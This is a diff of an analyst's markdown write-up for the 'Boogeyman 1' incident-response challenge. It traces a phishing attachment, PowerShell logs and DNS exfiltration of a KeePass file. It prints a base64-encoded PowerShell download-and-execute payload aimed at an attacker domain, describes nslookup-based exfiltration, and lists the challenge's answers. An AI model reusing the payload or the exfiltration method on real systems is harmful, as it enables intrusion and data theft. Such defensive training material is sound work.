@@ -9,10 +9,11 @@ Email Analysis 
 Questions 
 
 1. What is the email address used to send the phishing email?  
-- Opening up the dump.eml, and accessing thunderbird, we can observe the sender of the email.  
-    
-	![[328.png]]
-	Answer: agriffin@bpakcaging.xyz 
+- Opening up the dump.eml, and accessing thunderbird, we can observe the sender of the email.
+
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/328.png)
+
+Answer: agriffin@bpakcaging.xyz 
 
 2. What is the email address of the victim?  
 	Answer: julianne.westcott@hotmail.com 
@@ -22,38 +23,38 @@ Questions 
 - DKIM- Signature: DKIM (Domain Keys Identified Mail Signature) is a cryptographic signature added to an email header.  
 - We can observe the DKIM in the terminal using “cat” to read the file and “grep” to grab the specifics we are looking for.  
     
-	![[329.png]]
-	Answer: elasticmail 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/329.png)
+	
+Answer: elasticmail 
 
 4. What is the name of the file inside the encrypted attachment?  
 - First, we need to save the file to the Linux machine and unzip the file.  
     
-	![[330.png]]
-	 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/330.png)
 
 - We can then us the command “unzip” to unzip the file  
     
-	![[331.png]]
-- It is asking for a password.  
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/331.png)
 
+- It is asking for a password.  
 - In the email, there was a code sent the Julianne to access the attachment shown below. 
     
-	![[332.png]]
-	![[333.png]]
-	Answer:  Invoice_20230103.lnk 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/332.png)
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/333.png)
+
+Answer:  Invoice_20230103.lnk 
 
 5. What is the password of the encrypted attachment?  
-    
-
-Answer: Invoice_2023! 
-
-- We discovered this in question 4.  
+Answer: Invoice_2023!
+- We discovered this in question 4.
+  
 6. Based on the results of the Inkparse tool, what is the encoded payload found in the Command Line Argument field?  
 - To discover the encoded payload, we can “cat” the unzip attachment and observe the command line.  
 - Usually, when a payload is encrypted in a command line, the attacker uses base64 encryption  
     
-	![[334.png]]
-	Answer: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA== 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/334.png)
+
+Answer: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA== 
 
 Endpoint Security 
 - We can see that Julianne machine was compromised from a PowerShell execution. 
@@ -83,17 +84,20 @@ Questions 
 
 Method 1: cat powershell.json | jq | grep bpakcaging 
 
-![[335.png]] 
+![[alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/335.png) 
 
 Method 2: cat powershell.json | jg | grep .xyz 
-	![[336.png]]
-	Answer: cdn.bpakcaging.xyz, files.bpakcaging.xyz 
+
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/336.png)
+	
+Answer: cdn.bpakcaging.xyz, files.bpakcaging.xyz 
 
 2. What is the enumeration tool downloaded by the attacker?  
 - Since a tool was downloaded, http/https protocpl was used to get the tool from some website.  
     
-	![[337.png]]
-	Answer: Seatbelt  
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/337.png)
+
+Answer: Seatbelt  
 
 Seatbelt 
 
@@ -102,20 +106,16 @@ Seatbelt 
 [GhostPack/Seatbelt: Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt) 
 
 3. What is the file access by the attacker using the downloaded sq3.exe binary?  Provide the full file path with escape backslashes.  
-    
-
 - Let filter the sq3.exe in the terminal to see what we will get.  
     
-	![[338.png]] 
+	![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/338.png) 
 
 - We can see that the tool was executed within the Music\\ AppData\\Local path directory, but we need the full path of the sq3 executable.  
-    
-
 - Since we know that the machine is owned to user Julianne Westcott and is a Windows machine, we can grep for either westcott or Users to pull up the start of the path.  
     
-	![[339.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/339.png)
 
-	Answer: C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite 
+Answer: C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite 
 
 4. What is the software that uses the file in Q3? 
 	Answer: Microsoft Stick Notes
@@ -124,12 +124,9 @@ Seatbelt 
 
 5. What is the name of the exfiltrated file? 
 	Answer: protected_data.kdbx  
-
 - We obtained the answer from the screen shot above since the attacker was using discovery commands within the machine and was reading the file as well sending it back to the destination IP 167.71.211.113 
     
 6. What type of file uses the .kdbx file extension?  
-    
-
 Answer: Keepass 
 
 - .kdbx file extension is associated with KeePass, a password management application that securely stores user credentials in an encrypted database.  
@@ -139,8 +136,9 @@ Answer: Keepass 
 7. What is the encoding used during the exfiltration attempt of the sensitive file? 
 - Going back to the domain “bpakcaging” we can see the encrypted type shown below: 
     
-	![[340.png]]
-	Answer: hex 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/340.png)
+
+Answer: hex 
 
 8. What is the tool used for exfiltration?  
 	Answer: nslookup 
@@ -162,20 +160,22 @@ Questions:  
 - We can find this through wire shark. 
 - Since we know the ip address of the attacker, we can filter using http.response && ip.src 167.71.211.113 
     
-	![[341.png]]
-	Answer: Python 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/341.png)
+
+Answer: Python 
 
 2. What HTTP method is used by the C2 for the output of the commands executed by the attacker?  
 - The only HTTP method that performs out put is the POST method.  
 - We can also filter in Wireshark the domain that we discovered as well to determine the method , if we not so sure.  
 - We acan use http contain cdn.bpakcaging.xyz 
-	![[342.png]] 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/342.png) 
 
 - We can see some POST method occuring.  
 - Let filter for POST method to see if the attacker is continently using the method to obtain information from the targets machine.  
     
-	![[343.png]]
-	Answer: POST  
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/343.png)
+
+Answer: POST  
 
 - The attacker to retrieve the information but hiding it in hexadecimal that way whatever they are receiving is not being read through the traffic.  
 
@@ -183,36 +183,37 @@ Questions:  
 - Looking back in the terminal when we grep for bpakcaging, we notice nslookup was used in the execution. nslookup is a queries DNS for information.  
 - We can also use Wireshark to filter for dns activity associated with the domain files.bpakcaging.xyz 
     
-	![[344.png]]
-	Answer: dns  
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/344.png)
+
+Answer: dns  
 
 4. What is the password of the exfiltrated activity?  
 - The attacker was able to obtain records by using sq3.exe that accesses plum.sqlite.  
 - By doing so, the attacker was able to retrieve sensitive information. 
 - We can filter sq3.exe outputs shown below. 
     
-	![[345.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/345.png)
 	 
 
 - Next, we want to follow the tcp stream from the last results in time frame 1373.974419 
 	
-	![[346.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/346.png)
 	 
-	![[347.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/347.png)
 	 
 
 - Here we can see that plum.sqlite was used to store the information from the machine the attacker compromised.  
 - We can continue the follow the TCP stream to see the next output or maybe a encrypted value that was used to store the information.  
 - We are at stream 749 the next TCP stream should have encrypted outputs.  
     
-	![[348.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/348.png)
 	 
-
 - We can see there is a encrypted hexadecimal, let decode it to see what the attacker was able to retrieve from the targets machine.  
-- WE can use Cyberchef to decode the hexadecimal, and to decode this we will have to use “From Decimal” tp properly decode the hexadecimal  
+- We can use Cyberchef to decode the hexadecimal, and to decode this we will have to use “From Decimal” tp properly decode the hexadecimal  
     
-	![[349.png]]
-	Answer: %p9^3!lL^Mz47E2GaT^y 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/349.png)
+
+Answer: %p9^3!lL^Mz47E2GaT^y 
 
 5. What is the credit card number stored inside the exfiltrated file?  
 - To figure the credit card number, we will have to use T-shark.  
@@ -225,7 +226,7 @@ Questions:  
 - -e dns.qry.nmae <--- this is requesting to pulled the reults from the filter  “dny.qry.name 
 - | grep .bpakcaging.xyz” -- Searches the list of the extracted domain names and only show strings that are associated with .bpakcaging.xyz 
     
-	![[350.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/350.png)
 	 
 
 - This pull information that is not needed, so we need to filter the unnecessary info out and remove the empty spaces   
@@ -234,17 +235,18 @@ Questions:  
 - grep –v  -e “files” 0e “cdn” <---  -v performs an inverse search that remove lines that contains “files” or “cdn” 
 - tr –d ‘\n’ <--- this seletes all newline characters and join all the individual subdomain together into one single string.  
     
-	![[351.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/351.png)
 	 
 
 - Now that we clean up the encrypted values that were split, we can use cyber chef to decode the encrypted values.  
 - We can save the file with the .kdbx extension  
 - After we save the file we will then open he terminal and use keepass2 to the cc.kdbx file.  
     
-	![[352.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/352.png)
 	 
 
 - Here we will use the password we discovered (%p9^3!lL^Mz47E2GaT^y) 
     
-	![[353.png]]
-	Answer: 4024007128269551
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/fc91f0834264d1080baaf3413718cb6866b69182/SOC/SOC%20Challenges/BoogeyMan1/BoogeyMan%201/Boogey%20Man%201%20Img/353.png)
+
+Answer: 4024007128269551
